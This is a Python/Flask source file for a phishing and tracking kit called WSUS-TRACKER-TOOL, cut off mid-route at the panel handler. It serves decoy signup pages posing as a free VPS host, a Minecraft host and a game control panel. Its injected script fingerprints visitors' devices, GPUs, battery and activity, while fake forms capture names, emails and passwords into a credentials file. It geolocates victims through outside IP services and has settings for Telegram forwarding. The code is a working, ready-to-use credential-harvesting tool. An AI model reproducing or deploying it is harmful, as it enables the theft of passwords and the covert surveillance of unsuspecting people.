#!/usr/bin/env python3
"""
WSUS-TRACKER-TOOL — single-file build
github.com/whitigergaming-design/WSUS-TRACKER-TOOL

Terminal panel + cloudflared quick tunnel + decoy landing pages.
credits: whitiger | author: whitigergaming-design
"""
import json
import os
import platform
import re
import secrets
import shutil
import stat
import subprocess
import sys
import tarfile
import threading
import time
import urllib.request
from datetime import datetime, timezone

from flask import Flask, jsonify, make_response, request

BASE = os.path.dirname(os.path.abspath(__file__))
DATA = os.path.join(BASE, "data")
BIN = os.path.join(BASE, "bin")
HITS = os.path.join(DATA, "hits.jsonl")
CREDS = os.path.join(DATA, "creds.txt")
EXPORT = os.path.join(DATA, "export")
SETTINGS = os.path.join(DATA, "settings.json")

VERSION = "1.1.0"
COOKIE = "wst_sid"

DEFAULTS = {
    "theme": "nebula",
    "redirect": "https://www.hostinger.com/",
    "port": 8080,
    "sound": True,
    "clipboard": True,
    "geo": True,
    "telegram_token": "",
    "telegram_chat": "",
    "max_hits": 0,
    "timeout_min": 0,
}

THEME_LABELS = {
    "1": ("nebula", "NebulaVPS - free VPS signup"),
    "2": ("craftnode", "CraftNode - Minecraft server panel"),
    "3": ("pixelforge", "PixelForge - game control panel"),
}

# ------------------------------------------------------------------ colours
class C:
    R = "\033[0m"; B = "\033[1m"; D = "\033[2m"
    RED = "\033[91m"; GRN = "\033[92m"; YEL = "\033[93m"; BLU = "\033[94m"
    MAG = "\033[95m"; CYN = "\033[96m"; WHT = "\033[97m"; GRY = "\033[90m"


def enable_ansi():
    if os.name == "nt":
        os.system("")


def cls():
    os.system("cls" if os.name == "nt" else "clear")


def box(lines, color=C.CYN, title=None):
    w = max([len(l) for l in lines] + ([len(title)] if title else [0])) + 2
    print(color + "╭" + "─" * w + "╮" + C.R)
    if title:
        print(color + "│ " + C.B + title.ljust(w - 1) + C.R + color + "│" + C.R)
        print(color + "├" + "─" * w + "┤" + C.R)
    for l in lines:
        print(color + "│ " + C.R + l.ljust(w - 1) + color + "│" + C.R)
    print(color + "╰" + "─" * w + "╯" + C.R)


def copy_text(t):
    try:
        import pyperclip
        pyperclip.copy(t)
        return True
    except Exception:
        return False


def qr(t):
    try:
        import qrcode
        q = qrcode.QRCode(border=1)
        q.add_data(t)
        q.make(fit=True)
        q.print_ascii(invert=True)
        return True
    except Exception:
        return False


def bell():
    sys.stdout.write("\a")
    sys.stdout.flush()


def now():
    return datetime.now(timezone.utc).astimezone().isoformat(timespec="seconds")


# ------------------------------------------------------------------ settings
def ensure_dirs():
    for d in (DATA, EXPORT, BIN):
        os.makedirs(d, exist_ok=True)


def load_cfg():
    ensure_dirs()
    cfg = dict(DEFAULTS)
    if os.path.exists(SETTINGS):
        try:
            with open(SETTINGS, encoding="utf-8") as f:
                cfg.update(json.load(f))
        except Exception:
            pass
    return cfg


def save_cfg(cfg):
    ensure_dirs()
    with open(SETTINGS, "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=2)


# ------------------------------------------------------------------ geo
PRIVATE = ("127.", "10.", "192.168.", "172.16.", "172.17.", "172.18.", "172.19.",
           "172.2", "172.30.", "172.31.", "::1", "0.0.0.0")


def geo_lookup(ip):
    if not ip or ip.startswith(PRIVATE):
        return {}
    try:
        req = urllib.request.Request("https://ipwho.is/" + ip,
                                     headers={"User-Agent": "WST/1.0"})
        with urllib.request.urlopen(req, timeout=6) as r:
            d = json.load(r)
        if d.get("success"):
            conn = d.get("connection") or {}
            sec = d.get("security") or {}
            return {
                "country": d.get("country"), "country_code": d.get("country_code"),
                "region": d.get("region"), "city": d.get("city"),
                "zip": d.get("postal"), "lat": d.get("latitude"),
                "lon": d.get("longitude"), "isp": conn.get("isp"),
                "org": conn.get("org"), "asn": conn.get("asn"),
                "flag": (d.get("flag") or {}).get("emoji"),
                "proxy": sec.get("proxy"), "vpn": sec.get("vpn"),
            }
    except Exception:
        pass
    try:
        url = ("http://ip-api.com/json/%s?fields=status,country,countryCode,"
               "regionName,city,zip,lat,lon,isp,org,as,proxy" % ip)
        with urllib.request.urlopen(url, timeout=6) as r:
            d = json.load(r)
        if d.get("status") == "success":
            return {
                "country": d.get("country"), "country_code": d.get("countryCode"),
                "region": d.get("regionName"), "city": d.get("city"),
                "zip": d.get("zip"), "lat": d.get("lat"), "lon": d.get("lon"),
                "isp": d.get("isp"), "org": d.get("org"), "asn": d.get("as"),
                "proxy": d.get("proxy"),
            }
    except Exception:
        pass
    return {}


# ------------------------------------------------------------------ ua
BROWSERS = [("Edge", r"Edg(?:e|A|iOS)?/([\d.]+)"), ("Opera", r"OPR/([\d.]+)"),
            ("Samsung", r"SamsungBrowser/([\d.]+)"), ("Firefox", r"Firefox/([\d.]+)"),
            ("Chrome", r"Chrome/([\d.]+)"), ("Safari", r"Version/([\d.]+).*Safari")]
OSES = [("Windows 11", r"Windows NT 10\.0.*Win64.*(?:rv:1[0-9]{2})"),
        ("Windows 10", r"Windows NT 10\.0"), ("Windows 8.1", r"Windows NT 6\.3"),
        ("Windows 7", r"Windows NT 6\.1"), ("Android", r"Android[ /]([\d.]+)"),
        ("iOS", r"(?:iPhone|iPad|iPod).*OS ([\d_]+)"),
        ("macOS", r"Mac OS X[ /]([\d_.]+)"),
        ("Linux", r"(Ubuntu|Debian|Fedora|Arch|Linux)"), ("ChromeOS", r"CrOS")]


def parse_ua(ua):
    ua = ua or ""
    browser, bver = "Unknown", ""
    for name, rx in BROWSERS:
        m = re.search(rx, ua)
        if m:
            browser = name
            bver = next((g for g in m.groups() if g), "") or ""
            break
    osn, osv = "Unknown", ""
    for name, rx in OSES:
        m = re.search(rx, ua)
        if m:
            osn = name
            osv = next((g for g in m.groups() if g), "") or ""
            break
    if "iPad" in ua or "Tablet" in ua:
        dev = "Tablet"
    elif "Mobi" in ua or "iPhone" in ua:
        dev = "Mobile"
    else:
        dev = "Desktop"
    return {"browser": browser, "browser_version": bver, "os": osn,
            "os_version": osv.replace("_", "."), "device": dev}


# ------------------------------------------------------------------ store
class Store:
    def __init__(self):
        ensure_dirs()
        self.s = {}
        self.lock = threading.Lock()
        self.on_update = None
        self.hits = 0

    def touch(self, sid, ip, ua, theme, ref):
        with self.lock:
            new = sid not in self.s
            if new:
                self.s[sid] = {"id": sid, "first_seen": now(), "events": [],
                               "creds": [], "theme": theme, "referrer": ref}
                self.hits += 1
            d = self.s[sid]
            d["last_seen"] = now()
            d["ip"] = ip or d.get("ip")
            d["ua"] = ua or d.get("ua")
        self._flush(d)
        if self.on_update:
            self.on_update("new" if new else "touch", d, None)
        return d

    def merge(self, sid, data):
        with self.lock:
            d = self.s.get(sid)
            if not d:
                return None
            for k, v in data.items():
                if k not in ("id", "events", "creds"):
                    d[k] = v
        self._flush(d)
        return d

    def event(self, sid, name, extra=None):
        with self.lock:
            d = self.s.get(sid)
            if not d:
                return
            d["events"].append({"t": now(), "name": name, "data": extra})
        self._flush(d)

    def creds(self, sid, rec):
        with self.lock:
            d = self.s.get(sid)
            if not d:
                return
            rec["t"] = now()
            d["creds"].append(rec)
            line = " | ".join(str(rec.get(k, "")) for k in
                              ("t", "ip", "name", "email", "password", "plan"))
            with open(CREDS, "a", encoding="utf-8") as f:
                f.write(line + "\n")
        self._flush(d)
        if self.on_update:
            self.on_update("creds", d, rec)

    def all(self):
        return sorted(self.s.values(), key=lambda x: x.get("first_seen", ""), reverse=True)

    def _flush(self, d):
        with open(HITS, "a", encoding="utf-8") as f:
            f.write(json.dumps(d, ensure_ascii=False) + "\n")

    def reset(self):
        with self.lock:
            self.s.clear()
            self.hits = 0
        for p in (HITS, CREDS):
            open(p, "w").close()

    def to_csv(self):
        import csv
        path = os.path.join(EXPORT, "hits_%d.csv" % time.time())
        cols = ["id", "first_seen", "ip", "country", "city", "isp", "os",
                "browser", "device", "screen", "timezone", "gpu", "theme"]
        with open(path, "w", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=cols + ["creds"], extrasaction="ignore")
            w.writeheader()
            for d in self.all():
                row = {k: d.get(k, "") for k in cols}
                row["creds"] = " ; ".join("%s/%s" % (c.get("name"), c.get("password"))
                                          for c in d.get("creds", []))
                w.writerow(row)
        return path

    def to_json(self):
        path = os.path.join(EXPORT, "hits_%d.json" % time.time())
        with open(path, "w", encoding="utf-8") as f:
            json.dump(self.all(), f, indent=2, ensure_ascii=False)
        return path


# ------------------------------------------------------------------ collector js
COLLECT_JS = r"""
(function(){
  var fp={t:Date.now(),ref:document.referrer};
  function send(p,d,b){
    var body=JSON.stringify(d||{});
    if(b&&navigator.sendBeacon){navigator.sendBeacon(p,new Blob([body],{type:'application/json'}));return;}
    fetch(p,{method:'POST',headers:{'Content-Type':'application/json'},body:body,keepalive:true}).catch(function(){});
  }
  try{
    fp.screen=screen.width+'x'+screen.height;
    fp.avail=screen.availWidth+'x'+screen.availHeight;
    fp.viewport=innerWidth+'x'+innerHeight;
    fp.dpr=devicePixelRatio;fp.depth=screen.colorDepth;
    fp.orient=(screen.orientation||{}).type||'';
  }catch(e){}
  fp.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
  fp.tz_offset=new Date().getTimezoneOffset();
  fp.languages=navigator.languages?navigator.languages.join(', '):navigator.language;
  fp.cores=navigator.hardwareConcurrency||null;
  fp.ram=navigator.deviceMemory||null;
  fp.platform=navigator.platform||'';
  fp.vendor=navigator.vendor||'';
  fp.touch=navigator.maxTouchPoints||0;
  try{
    var gl=document.createElement('canvas').getContext('webgl');
    var dbg=gl.getExtension('WEBGL_debug_renderer_info');
    if(dbg){fp.gpu_vendor=gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);fp.gpu=gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);}
  }catch(e){}
  try{
    var c=document.createElement('canvas');c.width=220;c.height=60;
    var x=c.getContext('2d');x.textBaseline='top';x.font='15px Arial';
    x.fillStyle='#f60';x.fillRect(0,0,110,30);x.fillStyle='#069';
    x.fillText('WSUS-TRACKER-TOOL',2,12);x.fillStyle='rgba(102,204,0,.7)';
    x.fillText('canvas-fp',6,34);fp.canvas=c.toDataURL().slice(-96);
  }catch(e){}
  try{
    if(navigator.getBattery)navigator.getBattery().then(function(b){
      fp.battery=Math.round(b.level*100)+'%'+(b.charging?' charging':'');send('/api/collect',fp);
    });
  }catch(e){}
  try{
    var cn=navigator.connection||{};
    fp.net=[cn.effectiveType,cn.downlink&&cn.downlink+'mbps',cn.rtt&&cn.rtt+'ms'].filter(Boolean).join(' ');
  }catch(e){}
  var mv=0,kd=0;
  addEventListener('mousemove',function(){mv++},{passive:true});
  addEventListener('keydown',function(){kd++},{passive:true});
  addEventListener('blur',function(){send('/api/beacon',{name:'tab_blur'},true)});
  addEventListener('focus',function(){send('/api/beacon',{name:'tab_focus'},true)});
  setTimeout(function(){
    if((outerWidth-innerWidth>180)||(outerHeight-innerHeight>180))fp.devtools=true;
    send('/api/collect',fp);
  },300);
  setTimeout(function(){send('/api/collect',fp)},1600);
  addEventListener('pagehide',function(){
    fp.moves=mv;fp.keys=kd;fp.seconds=Math.round((Date.now()-fp.t)/1000);
    send('/api/beacon',{name:'left_page',data:fp},true);
  });
  window.WST={fp:fp,submit:function(form){
    var btn=form.querySelector('button[type=submit]');
    var err=form.querySelector('.err'),bar=form.querySelector('.bar'),prog=form.querySelector('.prog');
    var d=Object.fromEntries(new FormData(form).entries());
    if(!d.name||d.name.trim().length<2){err.textContent='Enter your name.';err.style.display='block';return;}
    if(!d.email||d.email.indexOf('@')<0){err.textContent='Enter a valid email address.';err.style.display='block';return;}
    if(!d.password||d.password.length<6){err.textContent='Password must be at least 6 characters.';err.style.display='block';return;}
    err.style.display='none';btn.disabled=true;btn.textContent='Creating account...';
    bar.classList.add('on');prog.classList.add('on');
    var steps=[[22,'Verifying email domain...'],[48,'Allocating storage node...'],[74,'Provisioning container...'],[92,'Almost ready...']];
    steps.forEach(function(s,i){setTimeout(function(){bar.firstElementChild.style.width=s[0]+'%';prog.textContent=s[1];},420*(i+1));});
    setTimeout(function(){
      d.fp=fp;
      bar.firstElementChild.style.width='100%';prog.textContent='Redirecting to your panel...';
      setTimeout(function(){
        fetch('/api/register',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)})
          .then(function(r){return r.json()}).then(function(j){location.href=j.redirect||'/'})
          .catch(function(){location.href='/'});
      },900);
    },2100);
  }};
})();
"""

# ------------------------------------------------------------------ css
BASE_CSS = """
:root{--bg:#0b0e14;--panel:#111722;--line:#1d2634;--txt:#e6ecf5;--mut:#8b9bb4;
--acc:__ACC__;--acc2:__ACC2__;--ok:#39d98a;--r:14px}
*{box-sizing:border-box;margin:0;padding:0}
body{background:radial-gradient(900px 500px at 15% -10%,rgba(91,140,255,.16),transparent 60%),
radial-gradient(700px 400px at 90% 0%,rgba(124,91,255,.14),transparent 55%),var(--bg);
color:var(--txt);font:15px/1.55 ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;min-height:100vh}
a{color:var(--acc);text-decoration:none}
.wrap{max-width:1120px;margin:0 auto;padding:0 22px}
header{border-bottom:1px solid var(--line);background:rgba(11,14,20,.82);backdrop-filter:blur(10px);position:sticky;top:0;z-index:20}
.nav{display:flex;align-items:center;gap:14px;height:62px}
.logo{display:flex;align-items:center;gap:10px;font-weight:800;font-size:17px;letter-spacing:-.3px}
.mark{width:30px;height:30px;border-radius:9px;display:grid;place-items:center;
background:linear-gradient(135deg,var(--acc),var(--acc2));color:#fff;font-size:15px;box-shadow:0 6px 18px rgba(91,140,255,.35)}
.nav nav{margin-left:auto;display:flex;gap:20px;font-size:14px;color:var(--mut)}
.nav nav a:hover{color:var(--txt)}
.btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;padding:11px 18px;
border-radius:10px;border:1px solid var(--line);background:#151d2b;color:var(--txt);
font-weight:650;font-size:14px;cursor:pointer;transition:.16s;font-family:inherit}
.btn:hover{border-color:#2c3a52;transform:translateY(-1px)}
.btn.p{background:linear-gradient(135deg,var(--acc),var(--acc2));border:0;color:#fff;box-shadow:0 8px 24px rgba(91,140,255,.3)}
.btn.g{width:100%}
.pill{display:inline-flex;gap:8px;align-items:center;padding:6px 13px;border-radius:999px;
border:1px solid var(--line);background:#111a27;color:var(--mut);font-size:12.5px;margin-bottom:20px}
.dot{width:7px;height:7px;border-radius:50%;background:var(--ok);box-shadow:0 0 0 4px rgba(57,217,138,.15)}
h1{font-size:clamp(29px,3.6vw,44px);line-height:1.1;letter-spacing:-1.3px;font-weight:820}
h1 span{background:linear-gradient(120deg,var(--acc),var(--acc2));-webkit-background-clip:text;background-clip:text;color:transparent}
.sub{color:var(--mut);font-size:15.5px;margin-top:16px;max-width:520px}
.grid{display:grid;gap:16px;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));margin:20px 0 46px}
.card{background:linear-gradient(180deg,#121a26,#0e141d);border:1px solid var(--line);border-radius:var(--r);padding:22px}
.card h3{font-size:15.5px;margin-bottom:8px}
.card p{color:var(--mut);font-size:13.6px}
.ico{width:36px;height:36px;border-radius:10px;display:grid;place-items:center;background:#182334;border:1px solid var(--line);margin-bottom:14px;font-size:16px}
.plans{display:grid;gap:16px;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));margin:12px 0 60px}
.plan{border:1px solid var(--line);border-radius:var(--r);padding:22px;background:#0f1620}
.plan.hot{border-color:var(--acc);box-shadow:0 0 0 1px rgba(91,140,255,.4) inset}
.plan .price{font-size:30px;font-weight:800;letter-spacing:-1px;margin:10px 0 4px}
.plan ul{list-style:none;margin:16px 0;font-size:13.5px;color:var(--mut);display:grid;gap:8px}
.plan li::before{content:"\\2713";color:var(--ok);margin-right:8px;font-weight:800}
footer{border-top:1px solid var(--line);padding:26px 0;color:var(--mut);font-size:13px;display:flex;gap:14px;flex-wrap:wrap;justify-content:space-between}
label{display:block;font-size:12.5px;color:var(--mut);margin:14px 0 6px;font-weight:600}
input{width:100%;padding:12px 13px;border-radius:9px;border:1px solid var(--line);background:#0b1119;color:var(--txt);font-size:14.5px;outline:0}
input:focus{border-color:var(--acc);box-shadow:0 0 0 3px rgba(91,140,255,.16)}
.hint{font-size:11.8px;color:#5d6c85;margin-top:12px;line-height:1.5}
.bar{height:5px;border-radius:99px;background:#182130;overflow:hidden;margin-top:16px;display:none}
.bar.on{display:block}
.bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--acc),var(--acc2));transition:width .35s}
.prog{display:none;margin-top:14px;font-size:13px;color:var(--mut)}
.prog.on{display:block}
.err{color:#ff6b6b;font-size:12.5px;margin-top:10px;display:none}
.term{background:#070a0f;border:1px solid var(--line);border-radius:12px;padding:16px;
font:12.6px/1.7 ui-monospace,Menlo,monospace;color:#9fb0c7;height:200px;overflow:hidden}
.term .g{color:var(--ok)}.term .y{color:#ffb020}.term .b{color:var(--acc)}
.stat{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin:26px 0 0}
.stat div{background:#0f1620;border:1px solid var(--line);border-radius:11px;padding:12px}
.stat b{display:block;font-size:17px}
.stat span{font-size:10.5px;color:var(--mut);text-transform:uppercase;letter-spacing:.6px}
/* split hero + inline signup */
.split{display:grid;grid-template-columns:1.02fr .98fr;gap:46px;align-items:start;padding:58px 0 54px}
.split h1{text-align:left}
.bullets{display:grid;gap:13px;margin-top:26px;font-size:14px;color:var(--mut);list-style:none}
.bullets li{display:flex;gap:11px;align-items:flex-start}
.bullets b{color:var(--txt)}
.check{color:var(--ok);font-weight:900;flex:none}
.trust{display:flex;gap:16px;align-items:center;color:#6b7b94;font-size:12px;margin-top:26px;flex-wrap:wrap}
.trust span{display:flex;gap:6px;align-items:center}
.signup{position:sticky;top:82px;background:linear-gradient(180deg,#121a26,#0d131c);
border:1px solid var(--line);border-radius:18px;padding:26px;box-shadow:0 26px 64px rgba(0,0,0,.5)}
.signup h2{font-size:19px;letter-spacing:-.4px;margin-bottom:6px}
.signup p.m{color:var(--mut);font-size:13.5px}
.picks{display:flex;gap:8px;margin-top:10px}
.pick{flex:1;border:1px solid var(--line);border-radius:9px;padding:9px 8px;font-size:12.3px;
color:var(--mut);cursor:pointer;text-align:center;margin:0;font-weight:600}
.pick input{display:none}
.pick:has(input:checked){border-color:var(--acc);color:var(--txt);background:#141d2b}
.legal{font-size:11.5px;color:#5d6c85;margin-top:14px;display:flex;gap:7px;align-items:flex-start;line-height:1.5}
.legal input{width:auto;margin-top:2px}
@media(max-width:880px){.split{grid-template-columns:1fr;gap:34px;padding-top:40px}.signup{position:static}}
@media(max-width:640px){.nav nav{display:none}.stat{grid-template-columns:repeat(2,1fr)}}
"""

PAGE = """<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>__TITLE__</title><style>__CSS__</style></head><body>
__BODY__
<script src="/c.js"></script></body></html>"""

FORM = """
<div class="signup" id="signup">
<h2>__H2__</h2><p class="m">__P__</p>
<form onsubmit="event.preventDefault();WST.submit(this)">
__PICKS__
<label>__L1__</label><input name="name" placeholder="__PH1__" autocomplete="name">
<label>__L2__</label><input name="email" type="email" placeholder="you@example.com" autocomplete="email">
<label>Password</label><input name="password" type="password" placeholder="Min. 6 characters" autocomplete="new-password">
<div class="err"></div><div class="bar"><i></i></div><div class="prog"></div>
<button class="btn p g" type="submit" style="margin-top:18px">__BTN__</button>
</form>
<p class="hint">__HINT__</p>
</div>
<script>
function open_(){var s=document.getElementById('signup');
s.scrollIntoView({behavior:'smooth',block:'center'});
var i=s.querySelector('input[name=name]');if(i)setTimeout(function(){i.focus()},420);}
</script>
"""

PICKS = """
<label style="margin-top:0">Plan</label>
<div class="picks">
<label class="pick"><input type="radio" name="plan" value="Starter" checked>Starter</label>
<label class="pick"><input type="radio" name="plan" value="Pro">Pro</label>
<label class="pick"><input type="radio" name="plan" value="Scale">Scale</label>
</div>
"""


def fill(t, **kw):
    for k, v in kw.items():
        t = t.replace("__%s__" % k.upper(), v)
    return t


def build(title, acc, acc2, body):
    return fill(PAGE, title=title,
                css=BASE_CSS.replace("__ACC__", acc).replace("__ACC2__", acc2),
                body=body)


def page_nebula():
    form = fill(FORM, h2="Create your free account",
                p="Free tier, no card. Your container boots in about 20 seconds.",
                picks=PICKS, l1="Full name", ph1="John Carter", l2="Work email",
                btn="Create free account",
                hint="By continuing you agree to the Terms of Service and Acceptable Use Policy.")
    body = """
<header><div class="wrap nav"><div class="logo"><span class="mark">&#9672;</span>NebulaVPS</div>
<nav><a href="#">Products</a><a href="#">Pricing</a><a href="#">Docs</a><a href="#">Status</a></nav>
<button class="btn p" onclick="open_()">Get started</button></div></header>
<div class="wrap split">
<div>
<span class="pill"><span class="dot"></span> 12,480 containers live &middot; 99.98% uptime</span>
<h1>Free NVMe VPS,<br><span>deployed in 40 seconds.</span></h1>
<p class="sub">Root access, full KVM isolation and unmetered bandwidth on a global anycast network. No credit card, no sales call.</p>
<ul class="bullets">
<li><span class="check">&#10003;</span><span><b>No card required.</b> The free tier stays free, forever.</span></li>
<li><span class="check">&#10003;</span><span><b>Instant deploy.</b> Your container is online before this page finishes loading.</span></li>
<li><span class="check">&#10003;</span><span><b>14 regions.</b> Frankfurt, Ashburn, Singapore, Sao Paulo and more.</span></li>
<li><span class="check">&#10003;</span><span><b>Full root.</b> SSH, snapshots and custom ISOs included on every plan.</span></li>
</ul>
<div class="trust"><span>&#128274; TLS 1.3</span><span>SOC 2 Type II</span><span>GDPR ready</span><span>4.8/5 Trustpilot</span></div>
</div>
""" + form + """
</div>
<div class="wrap grid">
<div class="card"><div class="ico">&#9889;</div><h3>NVMe Gen4 storage</h3><p>Up to 3.2 GB/s reads. No throttling, no noisy neighbours.</p></div>
<div class="card"><div class="ico">&#128737;</div><h3>DDoS protection</h3><p>Always-on 1.4 Tbps scrubbing at the edge, included free.</p></div>
<div class="card"><div class="ico">&#128260;</div><h3>Snapshots</h3><p>One-click rollback before you break anything.</p></div>
</div>
<div class="wrap"><h2 style="font-size:22px;margin-bottom:16px">Simple plans</h2></div>
<div class="wrap plans">
<div class="plan"><h3>Starter</h3><div class="price">$0</div>
<ul><li>1 vCPU</li><li>1 GB RAM</li><li>10 GB NVMe</li></ul><button class="btn g" onclick="open_()">Deploy</button></div>
<div class="plan hot"><h3>Pro</h3><div class="price">$4.50</div>
<ul><li>2 vCPU</li><li>4 GB RAM</li><li>80 GB NVMe</li></ul><button class="btn p g" onclick="open_()">Deploy</button></div>
<div class="plan"><h3>Scale</h3><div class="price">$12</div>
<ul><li>4 vCPU</li><li>8 GB RAM</li><li>200 GB NVMe</li></ul><button class="btn g" onclick="open_()">Deploy</button></div></div>
<footer class="wrap"><span>&copy; 2026 NebulaVPS Ltd.</span><span>Terms &middot; Privacy &middot; SLA &middot; AUP</span></footer>
"""
    return build("NebulaVPS - Free NVMe VPS & Cloud Containers", "#5b8cff", "#7c5bff", body)


def page_craftnode():
    form = fill(FORM, h2="Create your server",
                p="Boots in about 20 seconds on the free node. No card.",
                picks=PICKS, l1="Username", ph1="Steve_2011", l2="Email",
                btn="Start free server",
                hint="Server IP and panel link are emailed to you once provisioning finishes.")
    body = """
<header><div class="wrap nav"><div class="logo"><span class="mark">&#9935;</span>CraftNode</div>
<nav><a href="#">Hosting</a><a href="#">Modpacks</a><a href="#">Pricing</a><a href="#">Discord</a></nav>
<button class="btn p" onclick="open_()">Open panel</button></div></header>
<div class="wrap split">
<div>
<span class="pill"><span class="dot"></span> 3,102 servers online &middot; 1-click modpacks</span>
<h1>Your Minecraft world,<br><span>online in one click.</span></h1>
<p class="sub">Ryzen 9 nodes, instant modpack installs and a real control panel with full file access. The first server is free.</p>
<div class="stat"><div><b>1.8 ms</b><span>avg ping</span></div><div><b>Ryzen 9</b><span>5950X nodes</span></div>
<div><b>24/7</b><span>support</span></div><div><b>&infin;</b><span>slots</span></div></div>
<div class="term" id="t"></div>
<div class="trust"><span>&#128274; TLS 1.3</span><span>Paper &middot; Fabric &middot; Forge</span><span>Daily backups</span></div>
</div>
""" + form + """
</div>
<div class="wrap plans">
<div class="plan"><h3>Dirt</h3><div class="price">$0</div>
<ul><li>2 GB RAM</li><li>10 slots</li><li>Vanilla + Paper</li></ul><button class="btn g" onclick="open_()">Create</button></div>
<div class="plan hot"><h3>Iron</h3><div class="price">$3</div>
<ul><li>6 GB RAM</li><li>Unlimited slots</li><li>All modpacks</li></ul><button class="btn p g" onclick="open_()">Create</button></div>
<div class="plan"><h3>Netherite</h3><div class="price">$9</div>
<ul><li>16 GB RAM</li><li>Dedicated CPU</li><li>Custom JAR</li></ul><button class="btn g" onclick="open_()">Create</button></div></div>
<footer class="wrap"><span>&copy; 2026 CraftNode Hosting</span><span>Terms &middot; Privacy &middot; Refunds &middot; Status</span></footer>
<script>
var L=['<span class="b">[12:04:01]</span> [Server] Starting minecraft server version 1.21.4',
'<span class="b">[12:04:02]</span> [Server] Loading properties',
'<span class="b">[12:04:03]</span> [Server] Preparing level "world"',
'<span class="b">[12:04:05]</span> [Server] Preparing spawn area: 87%',
'<span class="g">[12:04:06]</span> [Server] Done (4.812s)! For help, type "help"',
'<span class="b">[12:04:09]</span> [Server] Steve_2011 joined the game',
'<span class="b">[12:04:14]</span> [Server] Alex joined the game',
'<span class="y">[12:04:20]</span> [Server] Can\\'t keep up! Running 42ms behind',
'<span class="b">[12:04:26]</span> [Server] Saving chunks...'];
var t=document.getElementById('t'),i=0;
(function k(){if(i<L.length){var d=document.createElement('div');d.innerHTML=L[i++];t.appendChild(d);t.scrollTop=t.scrollHeight;}setTimeout(k,900)})();
</script>
"""
    return build("CraftNode - Minecraft Server Hosting", "#39d98a", "#22b573", body)


def page_pixelforge():
    form = fill(FORM, h2="Sign in to your panel",
                p="Use the credentials from your provisioning email.",
                picks="", l1="Username", ph1="admin", l2="Email",
                btn="Sign in",
                hint="No account yet? Fill this in and we provision one on the free node.")
    body = """
<header><div class="wrap nav"><div class="logo"><span class="mark">&#9635;</span>PixelForge</div>
<nav><a href="#">Panel</a><a href="#">Nodes</a><a href="#">API</a><a href="#">Support</a></nav>
<button class="btn p" onclick="open_()">Sign in</button></div></header>
<div class="wrap split">
<div>
<span class="pill"><span class="dot"></span> v3.4.1 &middot; all nodes operational</span>
<h1>The control panel<br><span>your game server deserves.</span></h1>
<p class="sub">Live console, file manager, scheduled tasks and subusers - for Minecraft, Rust, ARK, Valheim and 40 more eggs.</p>
<ul class="bullets">
<li><span class="check">&#10003;</span><span><b>Live console.</b> Stream logs and send commands with no latency.</span></li>
<li><span class="check">&#10003;</span><span><b>File manager.</b> Drag, drop, edit and archive without FTP.</span></li>
<li><span class="check">&#10003;</span><span><b>Schedules.</b> Cron-style restarts, backups and announcements.</span></li>
</ul>
<div class="trust"><span>&#128274; TLS 1.3</span><span>2FA ready</span><span>API v1</span></div>
</div>
""" + form + """
</div>
<div class="wrap grid">
<div class="card"><div class="ico">&#9000;</div><h3>Live console</h3><p>WebSocket log streaming with full command input.</p></div>
<div class="card"><div class="ico">&#128101;</div><h3>Subusers</h3><p>Granular per-server permissions for your staff.</p></div>
<div class="card"><div class="ico">&#128230;</div><h3>40+ eggs</h3><p>One-click installers for every popular game.</p></div>
</div>
<footer class="wrap"><span>&copy; 2026 PixelForge Systems</span><span>Status &middot; Docs &middot; Discord</span></footer>
"""
    return build("PixelForge - Game Panel", "#ff7a45", "#ff4d6d", body)


PAGES = {"nebula": page_nebula, "craftnode": page_craftnode, "pixelforge": page_pixelforge}


# ------------------------------------------------------------------ flask
def client_ip():
    h = request.headers
    for k in ("CF-Connecting-IP", "X-Real-IP", "True-Client-IP"):
        if h.get(k):
            return h[k].strip()
    xff = h.get("X-Forwarded-For")
    if xff:
        return xff.split(",")[0].strip()
    return request.remote_addr or ""


def make_app(cfg, store):
    app = Flask(__name__)
    token = secrets.token_urlsafe(12)
    app.config["DASH_TOKEN"] = token

    def sid():
        return request.cookies.get(COOKIE) or secrets.token_hex(8)

    def attach(resp, s):
        resp.set_cookie(COOKIE, s, max_age=86400, samesite="Lax")
        return resp

    @app.after_request
    def headers(resp):
        resp.headers["Cache-Control"] = "no-store, max-age=0"
        resp.headers["X-Robots-Tag"] = "noindex"
        return resp

    @app.route("/")
    def index():
        s = sid()
        ip = client_ip()
        store.touch(s, ip, request.headers.get("User-Agent", ""),
                    cfg["theme"], request.headers.get("Referer", ""))
        if cfg.get("geo") and ip:
            threading.Thread(target=lambda: store.merge(s, {"geo": geo_lookup(ip)}),
                             daemon=True).start()
        return attach(make_response(PAGES[cfg["theme"]]()), s)

    @app.route("/c.js")
    def collector():
        return make_response(COLLECT_JS, 200,
                             {"Content-Type": "application/javascript"})

    @app.route("/api/collect", methods=["POST"])
    def collect():
        s = sid()
        ip = client_ip()
        ua = request.headers.get("User-Agent", "")
        store.touch(s, ip, ua, cfg["theme"], request.headers.get("Referer", ""))
        body = request.get_json(silent=True) or {}
        body.pop("id", None)
        body.update(parse_ua(ua))
        body["ip"] = ip
        body["ipv6"] = request.headers.get("CF-Connecting-IPv6", "")
        store.merge(s, body)
        return attach(jsonify(ok=True), s)

    @app.route("/api/register", methods=["POST"])
    def register():
        s = sid()
        ip = client_ip()
        store.touch(s, ip, request.headers.get("User-Agent", ""), cfg["theme"], "")
        body = request.get_json(silent=True) or {}
        fp = body.pop("fp", None)
        if isinstance(fp, dict):
            fp.pop("id", None)
            store.merge(s, fp)
        body["ip"] = ip
        store.creds(s, body)
        return attach(jsonify(ok=True, redirect=cfg["redirect"]), s)

    @app.route("/api/beacon", methods=["POST"])
    def beacon():
        b = request.get_json(silent=True) or {}
        store.event(sid(), b.get("name", "beacon"), b.get("data"))
        return ("", 204)

    @app.route("/favicon.ico")
    def favicon():
        return ("", 204)

    @app.route("/panel")
    def panel():
